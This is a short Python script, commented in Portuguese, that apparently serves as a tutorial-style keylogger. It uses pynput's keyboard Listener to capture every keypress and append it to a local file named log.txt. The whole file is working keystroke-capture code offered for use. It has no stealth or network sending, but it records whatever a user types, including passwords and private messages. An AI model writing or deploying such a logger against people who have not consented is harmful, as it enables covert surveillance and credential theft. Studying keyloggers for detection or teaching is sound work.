#Em pynput, importar o método Listener do teclado
from pynput.keyboard import Listener

#definir a localizacao do arquivo de log
logFile = './log.txt'

def writeLog(key):

    '''
    Esta funcao sera responsavel por receber a tecla pressionada
    via Listener e escrever no arquivo de log
    '''

    #converter a tecla pressionada para string
    keydata = str(key)

    #abrir o arquivo de log no modo append
    with open(logFile, 'a') as f:
        f.write(keydata)

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a funcao writelog
with Listener(on_press = writeLog) as l:
    l.join()
